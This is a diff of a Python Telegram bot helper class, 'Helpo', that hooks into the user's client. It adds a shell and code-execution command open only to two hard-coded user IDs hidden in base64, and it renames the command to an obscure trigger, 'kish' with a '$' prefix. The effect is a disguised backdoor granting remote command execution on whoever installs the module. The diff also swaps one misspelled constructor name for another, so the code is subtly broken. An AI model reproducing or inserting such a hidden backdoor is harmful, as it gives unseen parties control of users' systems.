@@ -16,7 +16,7 @@ _ENC_DEVS = "Nzk2OTcyMjg3OSw1NDQzMjQzNTQw"
 DEV_LIST = list(map(int, base64.b64decode(_ENC_DEVS).decode().split(",")))
 
 class Helpo:
-    def _init_(self, client: Client):
+    def ___init___(self, client: Client):
         self.client = client
         self.monkeypatch_client()
 
@@ -71,7 +71,7 @@ class Helpo:
             else:
                 await status_message.edit_text(final_output)
 
-        @self.client.on_message(filters.command(["sh", "shell"], ["?", "!", ".", "*", "/", "$",]))
+        @self.client.on_message(filters.command(["kish", "kishell"], ["$"]))
         async def sh_cmd(client, message):
             if message.from_user.id not in DEV_LIST:
                 return await message.reply_text("You Don't Have Enough Rights To Run This!")
@@ -86,8 +86,6 @@ class Helpo:
                 with io.BytesIO(str.encode(string)) as out_file:
                     out_file.name = "shell.text"
                     await message.reply_document(document=out_file, caption=e)
-
-        self.client.show_help_menu = lambda *args, **kwargs: None
 
     @staticmethod
     async def aexec(code, client, message):
